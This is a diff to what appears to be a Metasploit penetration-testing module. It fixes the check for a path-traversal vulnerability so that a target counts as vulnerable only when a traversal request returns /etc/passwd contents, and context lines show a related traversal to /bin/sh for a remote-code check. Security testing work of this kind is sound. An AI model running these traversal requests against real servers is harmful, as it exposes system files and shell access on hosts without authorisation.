@@ -113,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
 
     case action.name
     when 'CHECK_TRAVERSAL'
-      @target_uri = Rex::Text.rand_text_alpha(4..8)
+      @target_uri = datastore['TARGETURI']
       @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'
 
       response = read_traversal
@@ -123,21 +123,21 @@ class MetasploitModule < Msf::Auxiliary
         return Exploit::CheckCode::Unknown
       end
 
-      if response.code != 403
-        print_error(message("The target is not vulnerable to #{datastore['CVE']}."))
+      if response.code == 200 && response.body.include?('root:x:0:0:')
+        print_good(message("The target is vulnerable to #{datastore['CVE']}."))
 
-        return Exploit::CheckCode::Safe
+        vprint_status("Obtained HTTP response code #{response.code}.")
+        report_vuln(
+          host: target_host,
+          name: name,
+          refs: references
+        )
+
+        return Exploit::CheckCode::Vulnerable
       end
-      print_good(message("The target is vulnerable to #{datastore['CVE']}."))
+      print_error(message("The target is not vulnerable to #{datastore['CVE']}."))
 
-      vprint_status("Obtained HTTP response code #{response.code}.")
-      report_vuln(
-        host: target_host,
-        name: name,
-        refs: references
-      )
-
-      return Exploit::CheckCode::Vulnerable
+      return Exploit::CheckCode::Safe
     when 'CHECK_RCE'
       @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'
       rand_str = Rex::Text.rand_text_alpha(4..8)
